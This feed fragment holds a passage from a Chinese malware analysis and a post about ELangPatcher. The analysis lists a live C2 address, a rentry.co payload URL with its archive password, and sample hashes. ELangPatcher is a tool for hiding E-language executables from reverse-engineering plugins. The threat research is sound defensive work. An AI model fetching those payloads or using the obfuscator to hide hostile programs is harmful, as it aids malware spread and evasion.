src="https://wechat2rss.xlab.app/img-proxy/?k=2cd5a6bf&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1SBVSAx1FBkYSn6XnqtM3Pz9DcACjJ3j2SoH9zZ7KoesemohkGSeoSw%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>C2为40.66.42.41:9471，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=8a931cc0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1IhfxkfD00ugctqdbybHbHClQ8sTNX0eYob0vicVcoDyoEKKbQ3uStsQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="819" /></p><p><br /></p><p>此外，通过C2地址与端口，还发现了一份相同C2相同配置的疑似AsyncRAT样本，是一个PowerShell脚本文件，有兴趣的可以研究一下(https://tria.ge/240401-nslb6adc7s, SHA256: f23e4b5e2ed8fd275c1cb96d55becb6e357c6fd92c354127046957412202a9d121c2f385b804d5f441f7c4e3c921e15d9af89e72b9bfb845443deb54c2a25ff7)：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ee434bff&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1jJoQH4PX9iajy0fa1aPZzjtuA2AibE2q2xDzGrIHzV7ia7PKFf6klWCfg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="629" /></p><p><br /></p><p>而WinSAT.exe为NSIS自解压程序包，内含一个app-32.7z压缩包，将其解压后可以发现其内部是一个Electron应用，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=48c7f981&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1xFq6FzyXQM5rGbiaQb1FXgmDzZJ0QdQf2XCpjulj70WR4DJZqt2hLLw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1014" /></p><p><br /></p><p>恶意软件制作者通过修改Electron依赖app.asar内的index.js、config_obf.js与package.json从而实现恶意行为，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=272ce72f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1S5b3kIFpnjRJuLgFNvMSJfAv7uy5XkpRGag4uYJ3Qs8MbTSteibC8kQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ff826494&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl12qOn5MPeAsEVK3d5C4ejKdejr64Xav9iaCEkQuKQCUkZicYyQfpj6UYw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1023" /><span></span></p><p><br /></p><h3>三、Microsoft.7z</h3><p>在上述逻辑执行完成后，程序会睡眠一段时间，然后其会执行下一个逻辑：下载7-Zip组件（至ProgramData下）与https://rentry.co/MuckSoft/raw下的加密压缩包进行解压（解压密码为"somaliMUSTAFA681!!..."），如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=16629600&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1pTAia9j2XfQPAicfnyzhogvF6CgPn5DuDPFP32bREIicicYMCHBvhYpHag%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=1d676623&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1iaPMcXicj68ayR65IxywEn2um97dEfwUs1wypkydK94BByn9ZDratk4Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span></p><p><br /></p><p>我们手动访问URL，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=68f759bb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1ncZncwiaIPgehgdGr4u4QxC7jCiaBHFd7MH3icLjvqaGvKnwZqymGPwFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="833" /></p><p><br /></p><p>下载之后得到Microsoft.7z，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=87218ca6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1LX9x9ysv1fQpJ9g847To2fNzG5lH6SeovuCorMwovqnwOQzicD1GQaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="836" /></p><p><br /></p><p>将Microsoft.7z解压后可以发现其内部是一个Electron应用，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=405bf4f4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1XgrswTNPgdykj9ibY8XLDevyPjiaQGpCQtbxxM7l9L8vuKZlBtAmb3lg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="631" /></p><p><br /></p><p>运行Microsoft.exe后可以发现同样也会释放先前的Service.exe，并且具备与先前的Service.exe十分接近的恶意行为，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=47e90abe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl15UYeiaO2T5Kicl7MtbZb60dC4ric8WaLnZDtF7o8btjy7WQBqiauyBYzMw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1022" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=707523f5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1InhicK5hXyajTWYrcYAIkynYHMD7QcB7VgmCxcsDiaHfF48z9SBLgr1g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="714" /><span></span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=5f63015c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1nKwWxicPCm5CFd7JSlns9MUY5icLK3w0NpQFDXf0ibetj0BDDDiauoYKeQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="680" /><span></span></p><p><br /></p><p>恶意软件制作者通过修改Electron依赖app.asar内的main.bundle.js从而实现恶意行为，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=6b6fa7cb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1HibGr4byfN0qh9hr3cfibEvdCc9OVyglrhg0bKlVibtjia3etzUWbfvLvg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="915" /></p><p><br /></p><p>我们通过线索捕获到了该恶意软件的一整条攻击链，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=cf4cdab6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1c61XQrmHmnwu41NuZfWElHVpZNYCM5gF2oRNRfmhlL5IPtv96b5Ucw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>我们发现，该恶意软件攻击链通过采用两个.NET恶意下载者下载最终载荷，最终载荷中包含了两个恶意的Electron模块，而在最终载荷中看似毫不相关单独释放的Service.exe模块，却与其中的一个恶意Electron模块产生了联系，此外还有一个注入RegAsm.exe且通信协议疑似为AsyncRAT的恶意模块。由此可见，该恶意软件行为链条完整，并且传播多种不同类型的恶意软件。</span></p><p><br /></p><h2>（一）恶意GitHub organization</h2><p>https://github.com/Hayrowi</p><h2>（二）C2</h2><p>40.66.42.41:9471</p><h2>（三）样本文件Hash</h2><p>文件名称：DLL Injector Resou.nls.scr<br />SHA256：1ed90c2a319e37c10a4646c8ae087d691ab13cbf2d39066080a96c685ab9c6c1</p><p>文件名称：VisualStudio.exe<br />SHA256：ced23104253e55e011dd15862eec275352406b0541672bb9bdace10af2bf6a52</p><p>文件名称：Service.exe<br />SHA256：7f67bcf190c26e663aa465b4cadfc41816c3d6c95c18515d3ef75b9aa86e7209</p><p>文件名称：aitstatic.exe<br />SHA256：630c70be4bf71082167abe3e0da283ce25b95a26e5c9b185ca3ec0a95d0ca3a5</p><p>文件名称：ComSvcConfig.exe<br />SHA256：dad9345512882c703297c4e3608eab4de31463264b1121b9f57d3b116b8c9177</p><p>文件名称：WinSAT.exe<br />SHA256：bffa0f9b42c64683b0cfc2d236614482474604aa61a44dbc07a5598755161502</p><p>文件名称：WinSAT.exe =&gt; $PLUGINSDIR\app-32.7z =&gt; resources\app\app.asar<br />SHA256：6a239058ca4150aeeb4477b0ff221f285879c7122023ea4983b567153c8ab644</p><p>文件名称：WinSAT.exe =&gt; $PLUGINSDIR\app-32.7z =&gt; resources\app\app.asar =&gt; config_obf.js<br />SHA256：4d018f58579616bec46f3d2fa03f8a41b1b5e68e4ccd01081cc3d96f01c5438c</p><p>文件名称：WinSAT.exe =&gt; $PLUGINSDIR\app-32.7z =&gt; resources\app\app.asar =&gt; index.js<br />SHA256：39dcb2ed9b874c3c49ac12b42801f0b02058dde3073fdfec3e9c1d687b4a5cc7</p><p>文件名称：MicrosoftCertificateServices.exe<br />SHA256：004d814eff2c57efadf1977f2b72957a8477a45413b2cf0fbe4424069f5469ca</p><p>文件名称：MicrosoftCertificateServices.exe<br />SHA256：ae0f5057a493097e2393df0fd713ddb02d04b3e2e6139c80655da1e59ad1917b</p><p>文件名称：Microsoft.7z =&gt; current\app.asar<br />SHA256：e5772f1c30fa84b138e670422e566d3a1f18aad74c257a19fad1f95811a1451a</p><p>文件名称：Microsoft.7z =&gt; current\app.asar =&gt; main.bundle.js<br />SHA256：039cb756025abfa0802cf5891d4b7d63a974160f52b3bdcb7f95f690de76294e</p><p><br /></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1913167-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 18 Apr 2024 17:49:06 +0800</pubDate>
</item>
<item>
<title>ELangPatcher - 一个简单的基于特征码的易语言静态编译程序膨胀与混淆工具</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140425&amp;idx=1&amp;sn=30beed51ba6fe1d836f264e0d07905b4&amp;chksm=bd50a11d8a27280b4675e00e503dfdaf9dae053b111d43a3b753a833ee548f4c0f94b0421565&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140425&amp;idx=1&amp;sn=30beed51ba6fe1d836f264e0d07905b4&amp;chksm=bd50a11d8a27280b4675e00e503dfdaf9dae053b111d43a3b753a833ee548f4c0f94b0421565&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-03-28 14:43</span> <span style="display: inline-block;">北京</span>
</p>

<p>针对易语言静态编译的代码进行轻微混淆处理，避免被插件一键识别部分关键函数。处理过的内容参考下方。注意该轻微膨胀/混淆只能用来对抗现有的“一键识别”工具，不能和加密壳的效果比。如果你能拿到这类工具的源码缝缝补补，应该也能让它重新识别。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=4e9e8aa3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW9OHegzK2VddU28NZObhpLCYVNJsibcw3FhNrDnpKUhsYWj4cuOdJ7btQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：爱飞的猫</span></strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p>针对易语言静态编译的代码进行轻微混淆处理，避免被插件一键识别部分关键函数。处理过的内容参考下方。</p><p>注意该轻微膨胀/混淆只能用来对抗现有的“一键识别”工具，不能和加密壳的效果比。</p><p>如果你能拿到这类工具的源码缝缝补补，应该也能让它重新识别。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=37b84b5a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW9ia0secmnZS1pN1mibm70ySRRvn8SNSyBygGVmxewaU5CZiaGic4ENO71Kw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>原理</h2><p>对已知的部分特征进行魔改，大部分时候都是对简单操作进行膨胀，然后开辟新的内存空间跳转过去。</p><p>因为生成代码计算绝对地址比较麻烦，所以依赖 CALL 指令自动入栈的返回地址来计算正确跳转位置。</p><h2>处理过的特征</h2><p>只处理了一小部分特征。手动整起来太麻烦了，感觉不如利用特征码自动标记然后上加密壳批量处理了。</p><ul><li style="margin-left: 2px;"><p>对抗 查找易语言按钮事件 插件</p></li><li style="margin-left: 2px;"><p>对抗 EWnd v0.2 插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 EWnd Ultimate 插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 E-Debug 程序/插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 E-Decompiler 插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 易语言逆向分析助手 的窗体信息分析</p></li><li style="margin-left: 2px;"><p>对抗易语言初始化入口识别（<code style="font-family: SFMono-Regular, Consolas, ;">cld; fninit; call xxxx</code>）</p></li><li style="margin-left: 2px;"><p>对抗控件处理事件识别（重写了个简单的，混淆程度不高 <code style="font-family: SFMono-Regular, Consolas, ;">call dword[ebp - 4]</code>）</p></li><li style="margin-left: 2px;"><p>处理了找到的一些乱七八糟的特征…</p></li></ul><h2>从源码构建</h2><p>首先确保安装有 VS 2022、CMake、Git for Windows 这三个程序。CMake 安装时需要选择将 <code style="font-family: SFMono-Regular, Consolas, ;">cmake.exe</code> 注册到系统。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">:: 克隆仓库<br />git clone https://github.com/FlyingRainyCats/ELangPatcher.git<br />cd ELangPatcher<br /><br />:: 更新子模组<br />git submodule update --init --recursive<br /><br />:: 开始构建<br />cmake -Bcmake-build-vs2022 -G <span style="color: rgb(168, 255, 96);">"Visual Studio 17 2022"</span> -A Win32<br />cmake --build cmake-build-vs2022 --config Release</code></pre><h2>使用方法</h2><p>将可执行文件拖放到 <code style="font-family: SFMono-Regular, Consolas, ;">ELangPatcher.exe</code> 即可处理。</p><p>可以指定额外参数：</p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">--suffix _p</code> 指定新的后缀，写出到新的文件。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-b, --backup</code> 是否备份原始文件，默认启用。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">--fake-stub</code> 插入假的特征码内容到文件，默认启用。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-h, --help</code> 查看帮助信息</p></li></ul><p>示例输出：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">* (<span style="color: rgb(255, 115, 253);">2</span>). <span style="color: rgb(168, 255, 96);">"M:\Programs\E_5.1\tools\ELangPatcher.exe"</span> --suffix _ -- <span style="color: rgb(168, 255, 96);">"M:\Projects\e-AntiWnd\测试3_5.1_静态编译.exe"</span><br />ELang Patcher v0<span style="color: rgb(255, 115, 253);">.1</span> by FlyingRainyCats (爱飞的猫 @52pojie<span style="color: rgb(255, 115, 253);">.</span>cn)<br /><span style="color: rgb(198, 197, 254);">INFO:</span> processing: M:\Projects\e-AntiWnd\测试<span style="color: rgb(255, 115, 253);">3_5.1_</span>静态编译.exe<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchDllFunctionInvokeCall] found (offset=<span style="color: rgb(255, 115, 253);">0x0001ac80</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffffffda</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchEWndV02] found (offset=<span style="color: rgb(255, 115, 253);">0x00013a40</span>, ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffffc787</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchEWndUltimate] found (offset=<span style="color: rgb(255, 115, 253);">0x00038adf</span>, data=<span style="color: rgb(255, 115, 253);">0x004816a0</span>, wnd_data_offset=<span style="color: rgb(255, 115, 253);">0x000816a0</span>)<br />    - stub added: <span style="color: rgb(255, 115, 253);">0x0048074d</span> (file offset: <span style="color: rgb(255, 115, 253);">0008074d</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchWndEventHandlerMain] found (fn_end=0001adb6, offset=<span style="color: rgb(255, 115, 253);">0x0001ad10</span>, inst=<span style="color: rgb(255, 115, 253);">0x0001ad3a</span>(p: <span style="color: rgb(255, 115, 253);">0x0041ad3a</span>), delta=<span style="color: rgb(255, 115, 253);">0xffff9ab1</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchKernelInvokeCall#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001ac90</span>, len=003b, replace_len=002c)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchKernelInvokeCall#<span style="color: rgb(255, 115, 253);">1</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001acd0</span>, len=<span style="color: rgb(255, 115, 253);">0031</span>, replace_len=<span style="color: rgb(255, 115, 253);">0025</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [ELibInvokeCall#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001ac60</span>, args=[<span style="color: rgb(255, 115, 253);">1</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff7dbf</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [ELibInvokeCall#<span style="color: rgb(255, 115, 253);">1</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001b0a0</span>, args=[<span style="color: rgb(255, 115, 253);">1</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff718f</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [LoadInitWindow#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001b020</span>, args=[<span style="color: rgb(255, 115, 253);">4</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff8b33</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [UnknownCtrlRelated#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001b040</span>, args=[<span style="color: rgb(255, 115, 253);">6</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff9a4b</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchLoadWndCall] found (offset=<span style="color: rgb(255, 115, 253);">0x000015cb</span>, ebx=<span style="color: rgb(255, 115, 253);">0x004017e0</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x0000012a</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchLoadWndCall] found (offset=<span style="color: rgb(255, 115, 253);">0x00001007</span>, ebx=<span style="color: rgb(255, 115, 253);">0x004017e0</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000006f7</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchLoadWndCall] found (offset=<span style="color: rgb(255, 115, 253);">0x000016aa</span>, ebx=<span style="color: rgb(255, 115, 253);">0x004017e0</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000054</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x000012f1</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000457</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x000013a1</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000003a7</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001449</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000002ed</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x000014d9</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x0000025d</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001584</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000001b2</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001626</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000110</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001686</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000000aa</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001707</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000011</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchELangLoaderInitStub] found (offset=<span style="color: rgb(255, 115, 253);">0x000016ed</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [MiscAddFakeEWndStub] <span style="color: rgb(150, 203, 254);">add</span> stub (len=<span style="color: rgb(255, 115, 253);">140</span> bytes)</code></pre><h3>集成到易语言</h3><ol><li style="margin-left: 2px;"><p>打开易语言目录；</p></li><li style="margin-left: 2px;"><p>打开该目录下的 <code style="font-family: SFMono-Regular, Consolas, ;">tools</code> 目录；</p></li><li style="margin-left: 2px;"><p>将 <code style="font-family: SFMono-Regular, Consolas, ;">ELangPatcher.exe</code> 放入该目录；</p></li><li style="margin-left: 2px;"><p>打开 <code style="font-family: SFMono-Regular, Consolas, ;">link.ini</code> 配置文件；</p></li><li style="margin-left: 2px;"><p>找到结尾的 <code style="font-family: SFMono-Regular, Consolas, ;">post_link_action</code> 区域，并添加新的操作。</p></li><ol 